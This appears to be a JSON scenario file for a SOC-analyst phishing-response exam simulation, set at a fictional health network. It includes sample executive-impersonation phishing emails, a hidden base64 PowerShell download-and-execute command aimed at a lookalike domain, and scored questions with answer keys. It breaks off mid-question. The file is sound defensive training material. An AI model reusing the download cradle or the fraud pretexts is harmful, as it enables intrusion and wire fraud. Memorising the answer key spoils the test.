@@ -1,0 +1,1141 @@
+{
+  "simulation_id": "D2-SIM-001",
+  "title": "The Phishing Campaign",
+  "domain": 2,
+  "category": "primary",
+  "difficulty": "intermediate",
+  "time_estimate": "45-60 minutes",
+  "passing_score": 200,
+  "max_score": 250,
+  
+  "exam_objectives": [
+    {
+      "id": "2.1",
+      "description": "Compare and contrast common threat actors and motivations",
+      "coverage": ["threat actor types", "motivations", "attributes", "TTPs"]
+    },
+    {
+      "id": "2.2",
+      "description": "Explain common threat vectors and attack surfaces",
+      "coverage": ["phishing", "spear-phishing", "email vectors", "social engineering", "credential harvesting"]
+    },
+    {
+      "id": "2.4",
+      "description": "Given a scenario, analyze indicators of malicious activity",
+      "coverage": ["email indicators", "network indicators", "behavioral indicators", "IoC analysis"]
+    }
+  ],
+  
+  "scenario_context": {
+    "organization": "MedCare Regional Health Network",
+    "industry": "Healthcare",
+    "size": "4,500 employees across 12 facilities",
+    "your_role": "SOC Analyst II",
+    "environment": {
+      "email_platform": "Microsoft 365",
+      "security_tools": ["Proofpoint Email Security", "CrowdStrike EDR", "Splunk SIEM", "ServiceNow ITSM"],
+      "compliance": ["HIPAA", "HITECH"],
+      "network": "Segmented by facility with centralized DC",
+      "recent_changes": "Implemented new patient portal 3 months ago"
+    },
+    "opening_narrative": "It's Tuesday morning at 7:42 AM when the Security Operations Center starts lighting up. Three separate users from the Finance department have reported suspicious emails claiming to be from the CFO requesting urgent wire transfers. Within 20 minutes, you've received seven more reports from various departments - HR, Patient Billing, and the Executive Assistant pool. The emails appear highly targeted, referencing specific internal projects and using proper formatting that mirrors legitimate internal communications. Your SOC Lead assigns you as primary analyst for this incident. Initial triage suggests this isn't opportunistic spam - someone has done their homework on MedCare."
+  },
+  
+  "artifacts": [
+    {
+      "id": "artifact_1",
+      "title": "Reported Phishing Email Samples",
+      "type": "evidence",
+      "unlocks_at": "start",
+      "content": {
+        "sample_1": {
+          "reported_by": "Janet Morrison, AP Specialist",
+          "timestamp": "2024-02-13 07:38:22 EST",
+          "headers": {
+            "from_display": "Robert Chen - CFO <r.chen@medcare-regional.com>",
+            "from_actual": "r.chen@medcare-reg1onal.com",
+            "reply_to": "rchen.finance@protonmail.com",
+            "subject": "Urgent: Q4 Vendor Payment - Action Required Today",
+            "received_spf": "softfail",
+            "dkim": "none",
+            "return_path": "bounce@medcare-reg1onal.com"
+          },
+          "body": "Janet,\n\nI need you to process an urgent payment to one of our medical supply vendors. The invoice was approved in yesterday's Finance Committee meeting but needs to go out today to maintain our preferred vendor status.\n\nAmount: $47,250.00\nVendor: Meridian Medical Supplies\nAccount: Will provide via secure channel\n\nPlease confirm receipt and I'll send the banking details. This is time-sensitive due to the quarter close.\n\nBest,\nRobert Chen\nChief Financial Officer\nMedCare Regional Health Network\n\nSent from my iPhone"
+        },
+        "sample_2": {
+          "reported_by": "Marcus Webb, HR Coordinator",
+          "timestamp": "2024-02-13 07:52:11 EST",
+          "headers": {
+            "from_display": "Sarah Patel - CHRO <s.patel@medcare-regional.com>",
+            "from_actual": "s.patel@medcare-regi0nal.com",
+            "reply_to": "spatel.hr@protonmail.com",
+            "subject": "Employee Data Export Needed - Confidential",
+            "received_spf": "softfail",
+            "dkim": "none"
+          },
+          "body": "Marcus,\n\nI'm working with our benefits consultant on the 2024 enrollment analysis. I need an export of all employee records including:\n- Full names and SSN\n- Salary information\n- Benefits elections\n- Emergency contacts\n\nPlease send as an encrypted Excel file to my personal email (in CC) as I'm traveling and having VPN issues.\n\nThis is for the board presentation Thursday - very time sensitive.\n\nSarah Patel\nChief Human Resources Officer"
+        },
+        "sample_3": {
+          "reported_by": "David Kim, Executive Assistant",
+          "timestamp": "2024-02-13 08:01:45 EST",
+          "headers": {
+            "from_display": "James Hartford - CEO <j.hartford@medcare-regional.com>",
+            "from_actual": "j.hartford@medcare-reglonal.com",
+            "reply_to": "jhartford.exec@protonmail.com",
+            "subject": "Quick favor - gift cards for staff appreciation"
+          },
+          "body": "David,\n\nI want to surprise the nursing staff with appreciation gift cards but need this done quietly. Can you purchase $5,000 in Amazon gift cards and send me the codes? Use the department card and we'll expense it.\n\nDon't mention this to anyone - want it to be a surprise!\n\nJim\n\nSent from mobile"
+        }
+      }
+    },
+    {
+      "id": "artifact_2",
+      "title": "OSINT Report - Lookalike Domains",
+      "type": "intelligence",
+      "unlocks_at": "decision_2",
+      "content": {
+        "investigation_date": "2024-02-13",
+        "domains_identified": [
+          {
+            "domain": "medcare-reg1onal.com",
+            "registered": "2024-02-08",
+            "registrar": "NameCheap",
+            "privacy": "WhoisGuard Protected",
+            "nameservers": ["ns1.hostinger.com", "ns2.hostinger.com"],
+            "mx_records": ["mail.medcare-reg1onal.com"],
+            "ip_resolution": "192.124.249.XX (Hostinger - Lithuania)"
+          },
+          {
+            "domain": "medcare-regi0nal.com",
+            "registered": "2024-02-08",
+            "registrar": "NameCheap",
+            "privacy": "WhoisGuard Protected",
+            "nameservers": ["ns1.hostinger.com", "ns2.hostinger.com"],
+            "ip_resolution": "192.124.249.XX (Hostinger - Lithuania)"
+          },
+          {
+            "domain": "medcare-reglonal.com",
+            "registered": "2024-02-09",
+            "registrar": "NameCheap",
+            "privacy": "WhoisGuard Protected",
+            "nameservers": ["ns1.hostinger.com", "ns2.hostinger.com"],
+            "ip_resolution": "192.124.249.XX (Hostinger - Lithuania)"
+          }
+        ],
+        "common_indicators": {
+          "registration_timing": "All within 4-5 days before campaign",
+          "infrastructure": "Shared hosting provider, same /24 netblock",
+          "technique": "Typosquatting using character substitution (1 for i, 0 for o, l for i)"
+        },
+        "legitimate_domain": {
+          "domain": "medcare-regional.com",
+          "registered": "2008-03-15",
+          "registrar": "GoDaddy",
+          "ip_resolution": "Azure West US datacenter"
+        }
+      }
+    },
+    {
+      "id": "artifact_3",
+      "title": "Threat Actor Profile Template",
+      "type": "reference",
+      "unlocks_at": "decision_3",
+      "content": {
+        "threat_actor_categories": {
+          "nation_state": {
+            "motivation": ["Espionage", "Sabotage", "Political influence"],
+            "resources": "High - government funding, sophisticated tools",
+            "sophistication": "High - zero-days, custom malware, long-term persistence",
+            "targeting": "Strategic - specific sectors, geopolitical alignment",
+            "indicators": ["Advanced TTPs", "Long dwell time", "Specific data exfil"]
+          },
+          "organized_crime": {
+            "motivation": ["Financial gain", "Data theft for resale"],
+            "resources": "Medium-High - RaaS, bulletproof hosting, money mules",
+            "sophistication": "Medium-High - commodity malware, social engineering",
+            "targeting": "Opportunistic with financial focus",
+            "indicators": ["BEC", "Ransomware", "Credential harvesting", "Wire fraud"]
+          },
+          "hacktivists": {
+            "motivation": ["Ideological", "Political statement", "Public embarrassment"],
+            "resources": "Low-Medium - volunteer networks, public tools",
+            "sophistication": "Low-Medium - DDoS, defacement, data leaks",
+            "targeting": "Organizations aligned with their cause",
+            "indicators": ["Public claims", "Defacement", "Data dumps"]
+          },
+          "insider_threat": {
+            "motivation": ["Financial", "Revenge", "Ideology", "Coercion"],
+            "resources": "Varies - existing access is primary advantage",
+            "sophistication": "Varies - legitimate access bypasses controls",
+            "targeting": "Specific to their access and grievance",
+            "indicators": ["Unusual access patterns", "Data hoarding", "Policy violations"]
+          },
+          "script_kiddies": {
+            "motivation": ["Curiosity", "Notoriety", "Learning"],
+            "resources": "Low - public tools and scripts",
+            "sophistication": "Low - following tutorials, pre-built tools",
+            "targeting": "Opportunistic - easy targets",
+            "indicators": ["Noisy attacks", "Known exploits", "Poor OpSec"]
+          }
+        }
+      }
+    },
+    {
+      "id": "artifact_4",
+      "title": "LinkedIn OSINT Findings",
+      "type": "intelligence",
+      "unlocks_at": "decision_4",
+      "content": {
+        "reconnaissance_evidence": {
+          "analysis_date": "2024-02-13",
+          "findings": [
+            {
+              "observation": "CFO Robert Chen posted about 'Excited to close out a strong Q4' on Feb 1",
+              "relevance": "Attackers knew quarter close timing"
+            },
+            {
+              "observation": "CHRO Sarah Patel posted 'Great board strategy session today!' on Feb 8",
+              "relevance": "Attackers knew board meeting schedule"
+            },
+            {
+              "observation": "MedCare corporate page announced 'New patient portal launch' in November",
+              "relevance": "Attackers aware of recent technology changes"
+            },
+            {
+              "observation": "Multiple Finance team members list their roles publicly",
+              "relevance": "Attackers could map organizational structure"
+            },
+            {
+              "observation": "Janet Morrison (first target) posted about 'vendor management certification'",
+              "relevance": "Targeted specifically for role in vendor payments"
+            }
+          ],
+          "assessment": "Attackers conducted systematic reconnaissance over several weeks using publicly available information to craft highly targeted pretext scenarios."
+        }
+      }
+    },
+    {
+      "id": "artifact_5",
+      "title": "Proofpoint Email Security Logs",
+      "type": "evidence",
+      "unlocks_at": "decision_5",
+      "content": {
+        "campaign_analysis": {
+          "date_range": "2024-02-13 06:00:00 to 08:30:00 EST",
+          "total_messages_detected": 47,
+          "disposition_breakdown": {
+            "quarantined": 12,
+            "delivered_suspicious": 23,
+            "delivered_clean": 12
+          },
+          "targeted_departments": [
+            {"department": "Finance", "count": 18},
+            {"department": "Human Resources", "count": 11},
+            {"department": "Executive", "count": 8},
+            {"department": "Patient Billing", "count": 6},
+            {"department": "IT", "count": 4}
+          ],
+          "sending_patterns": {
+            "source_ips": ["192.124.249.41", "192.124.249.42", "192.124.249.43"],
+            "send_rate": "Staggered - 2-5 minute intervals",
+            "personalization": "Each email uniquely crafted for recipient"
+          },
+          "why_some_delivered": "Lookalike domains were newly registered with valid SPF for their own domain. No DMARC reject policy on legitimate domain."
+        }
+      }
+    },
+    {
+      "id": "artifact_6",
+      "title": "CrowdStrike EDR Alert Summary",
+      "type": "evidence",
+      "unlocks_at": "decision_6",
+      "content": {
+        "alert_id": "CS-2024-0213-0847",
+        "timestamp": "2024-02-13 08:47:33 EST",
+        "host": "FINSRV-PC-Morrison",
+        "user": "jmorrison",
+        "alert_type": "Suspicious Process Execution",
+        "details": {
+          "parent_process": "OUTLOOK.EXE",
+          "child_process": "powershell.exe",
+          "command_line": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBjAHIAaQBwAHQALgBtAGUAZABjAGEAcgBlAC0AcgBlAGcAMQBvAG4AYQBsAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=",
+          "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://script.medcare-reg1onal.com/update.ps1')",
+          "network_connection": {
+            "destination_ip": "192.124.249.41",
+            "destination_port": 80,
+            "status": "Blocked by EDR"
+          },
+          "file_written": "C:\\Users\\jmorrison\\AppData\\Local\\Temp\\update.ps1",
+          "action_taken": "Process killed, network blocked, file quarantined"
+        },
+        "ioc_extraction": {
+          "urls": ["http://script.medcare-reg1onal.com/update.ps1"],
+          "ips": ["192.124.249.41"],
+          "file_hash": "SHA256: 8a4f7b2c9d1e5f6a3b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a"
+        }
+      }
+    },
+    {
+      "id": "artifact_7",
+      "title": "User Interaction Timeline",
+      "type": "evidence",
+      "unlocks_at": "decision_7",
+      "content": {
+        "compromised_users": [
+          {
+            "user": "jmorrison",
+            "department": "Finance",
+            "timeline": [
+              {"time": "07:38:22", "action": "Received phishing email"},
+              {"time": "08:44:15", "action": "Clicked link in email"},
+              {"time": "08:44:18", "action": "Credential harvesting page loaded"},
+              {"time": "08:45:02", "action": "Submitted credentials to fake page"},
+              {"time": "08:45:05", "action": "PowerShell payload attempted"},
+              {"time": "08:45:06", "action": "EDR blocked payload execution"},
+              {"time": "08:52:00", "action": "Reported suspicious email to IT"}
+            ],
+            "status": "Credentials compromised, malware blocked"
+          },
+          {
+            "user": "tprice",
+            "department": "Patient Billing",
+            "timeline": [
+              {"time": "08:02:45", "action": "Received phishing email"},
+              {"time": "08:31:22", "action": "Clicked link in email"},
+              {"time": "08:31:25", "action": "Credential harvesting page loaded"},
+              {"time": "08:31:58", "action": "Submitted credentials to fake page"},
+              {"time": "08:32:01", "action": "PowerShell payload executed"},
+              {"time": "08:32:15", "action": "C2 beacon established"}
+            ],
+            "status": "Credentials compromised, malware active - REQUIRES IMMEDIATE ATTENTION"
+          }
+        ],
+        "users_who_reported_without_clicking": 8,
+        "users_who_clicked_but_didnt_submit": 3
+      }
+    },
+    {
+      "id": "artifact_8",
+      "title": "Containment Status Dashboard",
+      "type": "operational",
+      "unlocks_at": "decision_8",
+      "content": {
+        "containment_actions": {
+          "email": {
+            "status": "IN PROGRESS",
+            "actions": [
+              "Proofpoint block rule for sender domains - COMPLETE",
+              "Message trace and purge from mailboxes - IN PROGRESS (32/47 purged)",
+              "Reply-to addresses blocked - COMPLETE"
+            ]
+          },
+          "network": {
+            "status": "COMPLETE",
+            "actions": [
+              "Firewall blocks for C2 IPs - COMPLETE",
+              "DNS sinkhole for malicious domains - COMPLETE",
+              "Proxy block for lookalike domains - COMPLETE"
+            ]
+          },
+          "endpoint": {
+            "status": "PARTIAL",
+            "actions": [
+              "jmorrison workstation - ISOLATED",
+              "tprice workstation - ISOLATION PENDING (user not responding)",
+              "Full EDR sweep initiated - 847/4500 endpoints scanned"
+            ]
+          },
+          "identity": {
+            "status": "IN PROGRESS",
+            "actions": [
+              "jmorrison password reset - COMPLETE",
+              "jmorrison sessions revoked - COMPLETE",
+              "tprice password reset - PENDING (requires manager approval)",
+              "Privileged account review - IN PROGRESS"
+            ]
+          }
+        }
+      }
+    },
+    {
+      "id": "artifact_9",
+      "title": "Incident Report Draft",
+      "type": "documentation",
+      "unlocks_at": "decision_10",
+      "content": {
+        "incident_id": "INC-2024-0213-001",
+        "classification": "Business Email Compromise / Credential Harvesting Campaign",
+        "severity": "High",
+        "status": "Contained - Investigation Ongoing",
+        "executive_summary": "Coordinated spear-phishing campaign targeting MedCare Regional Health Network personnel with financial and HR system access. Attackers used lookalike domains and extensively researched pretexts impersonating C-suite executives. Two confirmed credential compromises with one active malware infection contained.",
+        "threat_actor_assessment": {
+          "type": "Organized Criminal Group",
+          "confidence": "High",
+          "rationale": [
+            "Financial motivation evident from BEC targeting",
+            "Sophisticated reconnaissance and social engineering",
+            "Professional infrastructure setup",
+            "No nation-state indicators (no persistence focus, no espionage objectives)"
+          ]
+        },
+        "technical_indicators": {
+          "domains": ["medcare-reg1onal.com", "medcare-regi0nal.com", "medcare-reglonal.com"],
+          "ips": ["192.124.249.41", "192.124.249.42", "192.124.249.43"],
+          "email_addresses": ["rchen.finance@protonmail.com", "spatel.hr@protonmail.com", "jhartford.exec@protonmail.com"]
+        },
+        "lessons_learned_preview": [
+          "DMARC policy should be enforced (p=reject)",
+          "Security awareness training refresh needed",
+          "Executive impersonation alerting needed"
+        ]
+      }
+    }
+  ],
+  
+  "decision_points": [
+    {
+      "id": "decision_1",
+      "sequence": 1,
+      "title": "Initial Triage Priority",
+      "narrative": "You have three email samples reported within 25 minutes, all impersonating different C-suite executives. The SOC Lead wants your initial assessment: what's the first thing you need to determine to understand the scope of this threat?",
+      "question": "What should be your PRIMARY initial triage focus?",
+      "options": [
+        {
+          "id": "A",
+          "text": "Verify whether the executives actually sent these emails by calling them directly",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Helpful but not the priority",
+            "detailed": "While confirming with executives is good practice, the email headers already show these came from lookalike domains (reg1onal vs regional). Your priority should be understanding the campaign's scope - how many people received these emails and whether anyone has interacted with them.",
+            "consequence": "You spend 15 minutes reaching executives while potentially compromised users continue interacting with malicious emails."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Perform a message trace to identify ALL recipients of emails from these sender domains",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Excellent! Scope identification is critical",
+            "detailed": "Identifying the full scope of the campaign is essential. A message trace across your email security platform will reveal every user who received emails from these malicious domains, allowing you to understand the attack surface, identify potential victims, and prioritize containment actions. This data drives all subsequent response decisions.",
+            "consequence": "You quickly identify 47 targeted users across multiple departments and can prioritize response efforts."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Immediately block the sending domains at the email gateway",
+          "is_correct": false,
+          "points": 15,
+          "feedback": {
+            "short": "Important but premature",
+            "detailed": "Blocking is definitely needed, but doing it before understanding scope means you don't know who's already received emails. You need to trace first so you can identify users who need follow-up, then block to prevent additional delivery.",
+            "consequence": "Domains are blocked but you have no visibility into who already received and potentially clicked on malicious emails."
+          }
+        },
+        {
+          "id": "D",
+          "text": "Forward the samples to your threat intelligence vendor for analysis",
+          "is_correct": false,
+          "points": 5,
+          "feedback": {
+            "short": "Useful but not time-critical",
+            "detailed": "External threat intelligence analysis can provide valuable context but takes time. Your immediate priority during an active campaign is understanding internal scope and exposure. TI enrichment can happen in parallel but shouldn't delay response actions.",
+            "consequence": "You wait for external analysis while the attack window remains open."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "During an active phishing campaign, understanding who is affected determines your entire response strategy."
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "Use your email security platform's message trace capability to search for all messages from the malicious sender domains."
+        }
+      ],
+      "learning_note": "Initial triage of phishing campaigns should focus on SCOPE before CONTAINMENT. Understanding how many users received malicious emails, in which departments, and at what times provides the data needed for effective response prioritization."
+    },
+    {
+      "id": "decision_2",
+      "sequence": 2,
+      "title": "Attack Vector Analysis",
+      "narrative": "Your message trace reveals 47 emails sent to personnel across Finance (18), HR (11), Executive (8), Patient Billing (6), and IT (4). Looking at the sender domains, you notice: medcare-reg1onal.com, medcare-regi0nal.com, and medcare-reglonal.com. All registered within the past week.",
+      "question": "What type of attack technique are these domains demonstrating?",
+      "options": [
+        {
+          "id": "A",
+          "text": "Domain hijacking - the attackers compromised MedCare's legitimate domain",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "Incorrect - the legitimate domain wasn't compromised",
+            "detailed": "Domain hijacking would mean the attackers gained control of medcare-regional.com itself. These are different domains entirely - they use character substitution (1 for i, 0 for o, l for i) to create visually similar but distinct domains. The legitimate domain remains under MedCare's control.",
+            "consequence": "Misidentifying the attack type could lead to unnecessary panic about domain compromise and misdirected response efforts."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Typosquatting - registering domains with character substitutions to impersonate legitimate domains",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! Classic typosquatting technique",
+            "detailed": "Typosquatting (also called URL hijacking) involves registering domains that are visually similar to legitimate ones, typically using: character substitution (1/i, 0/o, l/i), adjacent key typos, added/removed characters, or different TLDs. These domains pass casual visual inspection, especially in email clients that may not display the full address.",
+            "consequence": "Accurate identification allows you to search for additional typosquat variants and implement appropriate domain monitoring."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Email header spoofing - forging the From address without registering domains",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Partially correct thinking, but different technique",
+            "detailed": "Header spoofing involves forging email headers without owning the spoofed domain. In this case, the attackers actually registered similar-looking domains and configured proper mail infrastructure. This is more sophisticated than simple header spoofing because the emails legitimately originate from domains the attacker controls, potentially bypassing some email security checks.",
+            "consequence": "Misunderstanding the technique could lead to underestimating the attacker's preparation and infrastructure investment."
+          }
+        },
+        {
+          "id": "D",
+          "text": "DNS poisoning - redirecting DNS queries to attacker-controlled servers",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "Incorrect - DNS infrastructure wasn't compromised",
+            "detailed": "DNS poisoning would involve corrupting DNS records or cache to redirect traffic. These attacks use legitimately registered lookalike domains with their own valid DNS records. No DNS infrastructure was compromised.",
+            "consequence": "Investigating non-existent DNS compromise wastes critical time and resources."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "Look carefully at the spelling differences between the malicious and legitimate domains. What characters have been substituted?"
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "This technique involves registering domains that visually resemble legitimate ones using character substitution - common pairs include 1/i, 0/o, l/1, rn/m."
+        }
+      ],
+      "learning_note": "Typosquatting is a common phishing technique where attackers register domains visually similar to legitimate ones. Organizations should proactively register common typosquat variants of their domain and implement monitoring for new lookalike domain registrations. Email security should be configured to flag emails from recently registered domains.",
+      "unlocks_artifact": "artifact_2"
+    },
+    {
+      "id": "decision_3",
+      "sequence": 3,
+      "title": "Threat Actor Attribution",
+      "narrative": "Analysis reveals the campaign infrastructure: domains registered through NameCheap with privacy protection 4-5 days ago, hosted on Hostinger (Lithuania), emails personalized for each recipient using information that appears to come from LinkedIn and public sources. The targeting is exclusively focused on employees with financial transaction authority or access to sensitive HR data.",
+      "question": "Based on these indicators, what type of threat actor is MOST likely behind this campaign?",
+      "options": [
+        {
+          "id": "A",
+          "text": "Nation-state actor conducting espionage operations",
+          "is_correct": false,
+          "points": 5,
+          "feedback": {
+            "short": "Unlikely given the indicators",
+            "detailed": "Nation-state actors typically focus on long-term persistent access for espionage purposes. They target intellectual property, state secrets, or strategic intelligence. This campaign's focus on financial personnel and wire transfer/payroll fraud indicates financial motivation rather than espionage. Nation-states also typically use more sophisticated infrastructure and may target specific individuals for intelligence value.",
+            "consequence": "Misattribution could lead to over-escalation and inappropriate response measures."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Organized cybercriminal group conducting Business Email Compromise",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! Classic BEC indicators",
+            "detailed": "This matches organized cybercrime patterns: financial motivation (wire transfers, gift cards), sophisticated but commodity infrastructure (privacy-protected registration, offshore hosting), extensive reconnaissance for social engineering, and targeting of finance/HR personnel. BEC groups invest in research to craft convincing pretexts and often operate with a professional structure including specialists for reconnaissance, email crafting, and money laundering.",
+            "consequence": "Accurate attribution informs appropriate response measures and helps predict likely next steps (follow-up attempts, escalation tactics)."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Hacktivist group targeting healthcare organizations",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "Doesn't match the indicators",
+            "detailed": "Hacktivists are ideologically motivated and typically seek to make public statements - website defacement, data leaks to embarrass targets, or service disruption. This campaign's focus on financial fraud with no ideological messaging or public claims doesn't align with hacktivist patterns. They also rarely invest in sophisticated BEC infrastructure.",
+            "consequence": "Misattribution leads to looking for ideological motives that don't exist and missing the financial threat."
+          }
+        },
+        {
+          "id": "D",
+          "text": "Disgruntled insider with knowledge of internal operations",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Possible but less likely",
+            "detailed": "While the personalization suggests internal knowledge, this information is publicly available through LinkedIn and corporate announcements. The infrastructure (overseas hosting, privacy protection) is more consistent with external actors than insiders. Insiders typically leverage their existing access rather than building external phishing infrastructure.",
+            "consequence": "Focusing on insider threat investigation could distract from external threat response."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "Consider the primary motivation evident in the email content - what are the attackers ultimately trying to obtain?"
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "Business Email Compromise (BEC) groups specialize in impersonating executives to conduct wire fraud. The FBI reports BEC as the most financially damaging cybercrime category."
+        }
+      ],
+      "learning_note": "Threat actor attribution helps predict attacker behavior and inform response. Key indicators include: motivation (financial, espionage, ideology, destruction), sophistication level, targeting patterns, and infrastructure choices. BEC groups are sophisticated criminal enterprises that invest heavily in reconnaissance to craft convincing pretexts.",
+      "unlocks_artifact": "artifact_3"
+    },
+    {
+      "id": "decision_4",
+      "sequence": 4,
+      "title": "Reconnaissance Assessment",
+      "narrative": "The emails reference specific internal details: Q4 quarter close timing, board meeting schedules, the new patient portal project, and organizational structure. Your CISO asks how the attackers obtained this information.",
+      "question": "What is the MOST likely reconnaissance method used by these attackers?",
+      "options": [
+        {
+          "id": "A",
+          "text": "They compromised an internal system and harvested information from email or documents",
+          "is_correct": false,
+          "points": 5,
+          "feedback": {
+            "short": "Possible but no evidence supports this",
+            "detailed": "Prior compromise would be a significant finding requiring immediate investigation. However, there's no evidence of internal system compromise - no alerts, no suspicious access logs. All the referenced information (quarter close, board meetings, org structure) is available through public sources. Assuming compromise without evidence leads to unnecessary panic.",
+            "consequence": "Launching a full compromise investigation when the information was publicly available wastes resources and creates organizational anxiety."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Open-Source Intelligence (OSINT) gathering from LinkedIn, corporate website, and news sources",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! OSINT is the most common BEC reconnaissance method",
+            "detailed": "BEC actors routinely use OSINT to craft convincing pretexts. LinkedIn profiles reveal organizational hierarchy, roles, and recent activities. Corporate websites and press releases announce major projects and personnel changes. News coverage and SEC filings provide financial timing. All the 'insider knowledge' in these emails could be obtained through patient OSINT collection.",
+            "consequence": "Understanding the reconnaissance method informs security awareness training focus and highlights the importance of information exposure management."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Social engineering calls to the organization posing as vendors or partners",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Possible but unnecessary given available public info",
+            "detailed": "While BEC actors do sometimes use pretexting calls (vishing), it introduces risk of detection. The information in these emails doesn't require direct contact - it's all available online. Attackers typically minimize interaction until they're ready to execute the fraud.",
+            "consequence": "Looking for evidence of social engineering calls that may not have occurred."
+          }
+        },
+        {
+          "id": "D",
+          "text": "Malware already present on employee devices exfiltrating information",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "This would be the phishing objective, not prerequisite",
+            "detailed": "The phishing emails themselves include malware payloads - this is the GOAL of the attack, not the reconnaissance method. If attackers already had malware on devices, they wouldn't need to phish for credentials. The reconnaissance phase uses passive methods to avoid detection.",
+            "consequence": "Confusing attack phases leads to incorrect investigation focus."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "Consider where the specific details mentioned in the emails might be publicly available."
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "LinkedIn, corporate websites, press releases, and SEC filings are treasure troves of information for attackers crafting spear-phishing campaigns."
+        }
+      ],
+      "learning_note": "OSINT reconnaissance is standard practice for sophisticated phishing campaigns. Organizations should conduct their own OSINT assessments to understand their exposure, train employees about information sharing risks, and implement processes for managing what information is publicly disclosed.",
+      "unlocks_artifact": "artifact_4"
+    },
+    {
+      "id": "decision_5",
+      "sequence": 5,
+      "title": "Why Did Emails Get Through?",
+      "narrative": "Your CISO is concerned: 'We spend millions on email security - why did 35 of these 47 emails reach user inboxes?' Looking at the Proofpoint logs, you need to explain the security gap.",
+      "question": "What is the PRIMARY reason these phishing emails bypassed email security?",
+      "options": [
+        {
+          "id": "A",
+          "text": "Proofpoint failed to detect the malicious content in the email bodies",
+          "is_correct": false,
+          "points": 5,
+          "feedback": {
+            "short": "Content filtering isn't the main issue",
+            "detailed": "The email content was suspicious but not definitively malicious - no malware attachments, no obviously malicious links in the initial emails. BEC emails are designed to appear as legitimate business communication. Content filtering alone struggles with social engineering attacks that don't contain technical indicators.",
+            "consequence": "Focusing on content filtering improvements misses the more fundamental authentication gap."
+          }
+        },
+        {
+          "id": "B",
+          "text": "The attackers used newly registered domains that hadn't been flagged as malicious yet",
+          "is_correct": false,
+          "points": 15,
+          "feedback": {
+            "short": "Contributing factor but not the root cause",
+            "detailed": "New domain reputation is a factor - security tools may not have threat intelligence on 4-day-old domains. However, this is expected behavior with typosquatting attacks. The more fundamental issue is that email authentication protocols could have caught these regardless of domain age if properly configured.",
+            "consequence": "Partially correct but misses the opportunity to implement stronger authentication controls."
+          }
+        },
+        {
+          "id": "C",
+          "text": "MedCare's DMARC policy is not set to reject, allowing spoofed-looking emails from external domains",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! DMARC enforcement is the key gap",
+            "detailed": "The emails show 'softfail' for SPF and 'none' for DKIM. This indicates the lookalike domains have their own valid SPF records (they legitimately control those domains), but MedCare's domain doesn't have a DMARC policy that tells receiving servers to reject emails claiming to be from their executives but coming from different domains. With p=reject DMARC, email servers would be instructed to reject emails where the From header domain doesn't match the authenticated sending domain.",
+            "consequence": "Identifying this gap leads to implementing DMARC enforcement, significantly reducing future BEC success rates."
+          }
+        },
+        {
+          "id": "D",
+          "text": "The attackers exploited a zero-day vulnerability in Proofpoint",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "No evidence of this",
+            "detailed": "There's no indication of any Proofpoint vulnerability being exploited. The emails were processed normally - some quarantined, some delivered based on scoring. The issue is policy configuration and the inherent challenges of detecting social engineering, not a product vulnerability.",
+            "consequence": "Blaming the vendor diverts attention from configuration improvements within your control."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "Look at the email header information in the artifacts. What do the SPF and DKIM results tell you?"
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "DMARC with p=reject policy tells receiving servers to block emails where the visible 'From' domain doesn't match the authenticated sending domain."
+        }
+      ],
+      "learning_note": "Email authentication (SPF, DKIM, DMARC) is critical for preventing domain impersonation. SPF validates sending servers, DKIM provides cryptographic signing, and DMARC ties them together with policy enforcement. A DMARC policy of 'p=reject' instructs receiving servers to reject emails failing authentication, significantly reducing successful phishing.",
+      "unlocks_artifact": "artifact_5"
+    },
+    {
+      "id": "decision_6",
+      "sequence": 6,
+      "title": "Payload Analysis",
+      "narrative": "CrowdStrike EDR fires an alert: one of the targeted users (Janet Morrison from Finance) clicked a link and submitted credentials to a fake page. The page then attempted to execute a PowerShell payload. EDR blocked execution but captured the decoded command: 'IEX (New-Object Net.WebClient).DownloadString('http://script.medcare-reg1onal.com/update.ps1')'",
+      "question": "What type of malicious technique does this PowerShell command represent?",
+      "options": [
